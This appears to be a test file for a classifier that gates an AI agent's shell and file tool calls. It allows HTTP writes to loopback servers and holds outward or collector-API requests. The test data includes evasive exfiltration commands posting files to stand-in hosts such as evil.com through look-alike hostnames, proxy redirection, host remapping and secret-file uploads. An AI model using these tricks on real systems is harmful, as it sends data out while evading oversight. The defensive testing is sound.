import { describe, expect, test } from "bun:test";
import { join } from "path";
import { classifyToolCall, parseShellSnapshot, type FloorProbes, type ShellDefinitions } from "./classify.js";
import type { FloorConfig, FloorVerdict } from "./gate.js";

/*
 * An HTTP request to a server on this machine (127.0.0.0/8, localhost, ::1,
 * 0.0.0.0) is not a write to a remote service, whatever its method or body:
 * a worker's own proxy or stub server is its own to drive. The collector's
 * ports stay held as its API, and a request the floor can't place on
 * loopback (a look-alike host, credentials before a remote host, a remote
 * proxy, a host remap, a config file) stays held as outward. A local server
 * that listens on loopback and forwards requests is not an outward write
 * because it calls fetch/http with a method; one whose own fetch names a
 * remote host is.
 */

const HOME = join("/", "fake", "home");
const DATA = join(HOME, ".local", "share", "standup");
const ROOT = join(DATA, "worktrees", "standup", "feat-1");
const INSTALL = join("/", "fake", "install");
const COMMON = join("/", "fake", "repo", ".git");
const SCRATCH = join(HOME, ".cache", "standup-scratch");
const OWN_SCRATCH = join(SCRATCH, "launch-1");

const config: FloorConfig = {
  v: 1,
  collectorUrl: "http://127.0.0.1:17777",
  launchId: "launch-1",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [],
  worktreeRoots: [join(DATA, "worktrees")],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [join(INSTALL, "packages", "collector", "src", "floor")],
  installDir: INSTALL,
  protectedPaths: [join(DATA, "secrets"), SCRATCH],
  tmpDirs: ["/tmp", OWN_SCRATCH],
  scratchRoot: SCRATCH,
  scratchDir: OWN_SCRATCH,
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
};

const PROXY = `import http from "node:http";

const upstream = process.env.UPSTREAM ?? "https://api.anthropic.com";

http
  .createServer(async (req, res) => {
    const chunks = [];
    for await (const c of req) chunks.push(c);
    const body = chunks.length ? Buffer.concat(chunks) : undefined;
    const r = await fetch(upstream + req.url, { method: req.method, headers: { "content-type": "application/json" }, body });
    res.writeHead(r.status, { "content-type": r.headers.get("content-type") ?? "application/json" });
    res.end(Buffer.from(await r.arrayBuffer()));
  })
  .listen(8787, "127.0.0.1");
`;

const STUB = `import http from "node:http";

http
  .createServer((req, res) => {
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ ok: true, method: req.method }));
  })
  .listen(8787);
`;

const LOCAL_CLIENT = `const r = await fetch("http://127.0.0.1:8787/v1/messages", { method: "POST", body: JSON.stringify({ a: 1 }) });
console.log(await r.json());
`;

const REMOTE_CLIENT = `const r = await fetch("https://api.example.com/v1/messages", { method: "POST", body: JSON.stringify({ a: 1 }) });
console.log(await r.json());
`;

const REMOTE_PROXY = `import http from "node:http";

http
  .createServer(async (req, res) => {
    const r = await fetch("https://api.example.com" + req.url, { method: "POST", body: "x" });
    res.end(await r.text());
  })
  .listen(8787, "127.0.0.1");
`;

const COLLECTOR_CLIENT = `const r = await fetch("http://127.0.0.1:17777/api/sessions", { method: "POST", body: "{}" });
console.log(await r.text());
`;

const proxyTo = (upstream: string, listen = `8787, "127.0.0.1"`) => `import http from "node:http";

const upstream = ${upstream};

http
  .createServer(async (req, res) => {
    const chunks = [];
    for await (const c of req) chunks.push(c);
    const body = chunks.length ? Buffer.concat(chunks) : undefined;
    const r = await fetch(upstream + req.url, { method: req.method, headers: { "content-type": "application/json" }, body });
    res.writeHead(r.status);
    res.end(Buffer.from(await r.arrayBuffer()));
  })
  .listen(${listen});
`;

const HTTP_REQUEST_PROXY = `import http from "node:http";

http
  .createServer((req, res) => {
    const up = http.request({ hostname: "127.0.0.1", port: 9000, path: req.url, method: req.method, headers: req.headers }, (r) => {
      res.writeHead(r.statusCode ?? 502, r.headers);
      r.pipe(res);
    });
    req.pipe(up);
  })
  .listen(8787, "127.0.0.1");
`;

const PORT_FROM_ENV_CLIENT = `const port = process.env.PORT ?? "8787";
const r = await fetch(\`http://127.0.0.1:\${port}/v1/messages\`, { method: "POST", body: "{}" });
console.log(await r.text());
`;

const FILES: Record<string, string> = {
  [join(ROOT, "server", "proxy-loopback.mjs")]: proxyTo(`"http://127.0.0.1:9000"`),
  [join(ROOT, "server", "proxy-collector.mjs")]: proxyTo(`"http://127.0.0.1:17777"`),
  [join(ROOT, "server", "proxy-env.mjs")]: proxyTo("process.env.UPSTREAM"),
  [join(ROOT, "server", "proxy-env-default.mjs")]: proxyTo(`process.env.UPSTREAM ?? "http://localhost:9000"`),
  [join(ROOT, "server", "proxy-argv.mjs")]: proxyTo("process.argv[2]"),
  [join(ROOT, "server", "proxy-any.mjs")]: proxyTo(`"http://127.0.0.1:9000"`, "8787"),
  [join(ROOT, "server", "http-request-proxy.mjs")]: HTTP_REQUEST_PROXY,
  [join(ROOT, "server", "port-env-client.mjs")]: PORT_FROM_ENV_CLIENT,
  [join(ROOT, ".git")]: `gitdir: ${COMMON}/worktrees/feat-1\n`,
  [join(ROOT, "body.json")]: `{"model":"x","messages":[]}\n`,
  [join(ROOT, "server", "proxy.mjs")]: PROXY,
  [join(ROOT, "server", "stub.mjs")]: STUB,
  [join(ROOT, "server", "local-client.mjs")]: LOCAL_CLIENT,
  [join(ROOT, "server", "remote-client.mjs")]: REMOTE_CLIENT,
  [join(ROOT, "server", "remote-proxy.mjs")]: REMOTE_PROXY,
  [join(ROOT, "server", "collector-client.mjs")]: COLLECTOR_CLIENT,
  [join(ROOT, "curl.cfg")]: `url = "https://api.example.com/v1"\n`,
  [join(DATA, "secrets", "token")]: "s3cret\n",
};

function probes(): Partial<FloorProbes> {
  const dirs = new Set<string>(["/", "/tmp", ROOT]);
  for (const f of Object.keys(FILES)) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(join(ROOT, ".git"));
  const defs: ShellDefinitions = { aliases: new Map(), functions: new Map() };
  parseShellSnapshot("", defs);
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: (dir) => (dir === ROOT ? COMMON : null),
    readFile: (p) => (p in FILES ? { ok: true, text: FILES[p]! } : { ok: false, reason: "missing" }),
    exists: (p) => p in FILES || dirs.has(p),
    isDirectory: (p) => dirs.has(p),
    listDir: (p) => (dirs.has(p) ? [...new Set([...Object.keys(FILES), ...dirs].filter((f) => f.startsWith(`${p === "/" ? "" : p}/`)).map((f) => f.slice(p.length + 1).split("/")[0]!))] : null),
    realpath: (p) => (p in FILES || dirs.has(p) ? p : null),
    homeDir: () => HOME,
    shellDefinitions: () => defs,
    awsAccount: () => null,
    now: () => Date.now(),
    gitTree: () => null,
    gitAncestor: () => null,
    gitBlob: () => ({ ok: false, reason: "missing" }),
  };
}

function bash(command: string, cwd = ROOT): FloorVerdict {
  return classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd }, config, probes());
}

function tool(toolName: string, toolInput: Record<string, unknown>): FloorVerdict {
  return classifyToolCall({ toolName, toolInput, cwd: ROOT }, config, probes());
}

function expectAllowed(v: FloorVerdict): void {
  expect(v).toEqual({ action: "allow" });
}

function expectHeld(v: FloorVerdict, category: string): void {
  expect(v).toMatchObject({ action: "hold", category });
}

describe("curl writes to a server on loopback", () => {
  test.each([
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json",
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -H 'content-type: application/json' -d @body.json",
    "curl http://localhost:8787/api/x -H 'content-type: application/json' --data '{\"a\":1}'",
    "curl -X PUT http://[::1]:3000/items/1 -d 'x=1'",
    "curl -X DELETE http://0.0.0.0:3000/items/1",
    "curl -X POST http://127.0.0.2:8080/hook --json '{\"a\":1}'",
    "curl -sS -X POST localhost:8787/v1/messages -d @body.json",
    "curl -s --data-binary @body.json http://127.0.0.1:8787/v1/messages",
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json | jq .",
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -d @/tmp/body.json",
    "curl -x http://127.0.0.1:9000 -X POST http://localhost:8787/x -d a",
    "PORT=8787; curl -s -X POST http://127.0.0.1:$PORT/v1/messages -d @body.json",
    "curl -s -X POST http://127.0.0.1:${PORT:-8787}/v1/messages -d @body.json",
    "timeout 10 curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json",
    "node server/stub.mjs & sleep 1; curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json; kill %1",
    "sleep 1 && curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json",
    "for i in 1 2 3; do curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json; done",
    'bash -c "curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json"',
    "OUT=$(curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json); echo $OUT",
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json -o /tmp/resp.json",
    `curl -s -X POST http://127.0.0.1:8787/v1/messages -d @${join(OWN_SCRATCH, "body.json")}`,
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -d @$TMPDIR/body.json",
    "curl -s -w '%{http_code}' -X POST http://127.0.0.1:8787/v1/messages -d @body.json",
    "curl -s -X POST http://127.0.0.1:5000/v1/messages -H 'x-api-key: test' -d @body.json",
    "wget -q -O- --post-data 'a=1' http://127.0.0.1:8787/x",
    "wget -q -O- --method=PUT --body-data 'a=1' http://localhost:8787/x",
    "http POST localhost:8787/x a=1",
    "xh PUT http://127.0.0.1:8787/x a=1",
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -d @- <<'EOF'\n{\"model\":\"x\"}\nEOF",
    "echo '{}' | curl -s -X POST http://127.0.0.1:8787/v1/messages --data-binary @-",
    "curl -s -X POST http://127.0.0.1:8787/v1/messages \\\n  -H 'content-type: application/json' \\\n  -H 'anthropic-version: 2023-06-01' \\\n  -d @body.json",
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -H \"x-api-key: $ANTHROPIC_API_KEY\" -d @body.json",
    "curl -sN --max-time 30 -X POST http://127.0.0.1:8787/v1/messages -d @body.json | head -50",
    "cd server && curl -s -X POST http://127.0.0.1:8787/v1/messages -d @../body.json",
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json | python3 -m json.tool",
    "curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json; echo; curl -s http://127.0.0.1:8787/health",
    "curl -fsS -X POST 'http://127.0.0.1:8787/v1/messages?beta=true' -d @body.json",
    "curl -s -o /dev/null -w '%{http_code}\\n' -X PATCH http://localhost:3000/api/x -d '{}'",
  ])("%s", (command) => expectAllowed(bash(command)));
});

describe("curl writes that stay held", () => {
  test.each([
    ["curl -s -X POST http://127.0.0.1:17777/api/sessions -d '{}'", "collector-api"],
    ["curl -s -X POST http://localhost:17777/api/hook -d @body.json", "collector-api"],
    ["curl -s -X POST http://127.0.0.1:27777/api/sessions -d '{}'", "collector-api"],
    ["curl -s -X POST http://[::1]:27778/api/sessions -d '{}'", "collector-api"],
    ["curl -s -X POST http://127.0.0.1.evil.com:8787/v1/messages -d @body.json", "outward"],
    ["curl -s -X POST http://localhost@evil.com/v1/messages -d @body.json", "outward"],
    ["curl -s -X POST http://localhost.evil.com/v1/messages -d @body.json", "outward"],
    ["curl -s -X POST http://0x7f.1:8787/v1/messages -d @body.json", "outward"],
    ["curl -s -X POST https://api.example.com/v1/messages -d @body.json", "outward"],
    ["curl --resolve localhost:8787:203.0.113.5 -X POST http://localhost:8787/x -d a", "outward"],
    ["curl --connect-to localhost:8787:evil.com:443 -X POST http://localhost:8787/x -d a", "outward"],
    ["curl -x http://proxy.example.com:3128 -X POST http://localhost:8787/x -d a", "outward"],
    ["curl --proxy socks5://evil.com:1080 -X POST http://localhost:8787/x -d a", "outward"],
    ["HTTPS_PROXY=http://proxy.example.com:3128 curl -X POST http://localhost:8787/x -d a", "outward"],
    ["curl -K curl.cfg -X POST http://localhost:8787/x -d a", "outward"],
    ["curl --config curl.cfg -X POST http://localhost:8787/x -d a", "outward"],
    ["curl -X POST http://localhost:8787/x http://evil.com/y -d a", "outward"],
    // A port only known at run time may be the collector's.
    ['curl -s -X POST "http://127.0.0.1:${PORT}/v1/messages" -d @body.json', "outward"],
    ["curl -s -X POST http://127.0.0.1:$(cat /tmp/port)/v1/messages -d @body.json", "outward"],
  ])("%s", (command, category) => expectHeld(bash(command), category));

  test("a loopback request uploading an owner secret is held", () => {
    const v = bash(`curl -s -X POST http://127.0.0.1:8787/x -d @${join(DATA, "secrets", "token")}`);
    expect(v.action).toBe("hold");
  });
});

describe("a local proxy or stub server", () => {
  test.each([
    "node server/stub.mjs",
    "bun server/proxy-loopback.mjs",
    "node server/local-client.mjs",
    "cat server/proxy.mjs",
    "node server/proxy-loopback.mjs",
    "node server/proxy-env.mjs",
    "UPSTREAM=http://127.0.0.1:9000 node server/proxy-env.mjs",
    "node server/proxy-env-default.mjs",
    "node server/proxy-argv.mjs http://127.0.0.1:9000",
    "node server/proxy-argv.mjs",
    "node server/proxy-any.mjs",
    "node server/http-request-proxy.mjs",
    "node server/port-env-client.mjs",
    "node server/proxy-loopback.mjs & sleep 1; curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json; kill %1",
  ])("%s", (command) => expectAllowed(bash(command)));

  test("reading the proxy is allowed", () => expectAllowed(tool("Read", { file_path: join(ROOT, "server", "proxy.mjs") })));

  test("editing the proxy is allowed", () =>
    expectAllowed(tool("Edit", { file_path: join(ROOT, "server", "proxy.mjs"), old_string: ".listen(8787", new_string: ".listen(8788" })));

  test("writing a proxy is allowed", () => expectAllowed(tool("Write", { file_path: join(ROOT, "server", "proxy2.mjs"), content: PROXY })));
});

describe("code whose own request leaves loopback stays held", () => {
  test.each([
    ["node server/remote-client.mjs", "outward"],
    ["node server/remote-proxy.mjs", "outward"],
    // Its upstream's fallback is a remote URL the code names.
    ["node server/proxy.mjs", "outward"],
    ["bun server/proxy.mjs", "outward"],
    ["node server/proxy.mjs & sleep 1; curl -s -X POST http://127.0.0.1:8787/v1/messages -d @body.json; kill %1", "outward"],
    ["node server/proxy-collector.mjs", "collector-api"],
    ["node server/collector-client.mjs", "collector-api"],
  ])("%s", (command, category) => expectHeld(bash(command), category));
});
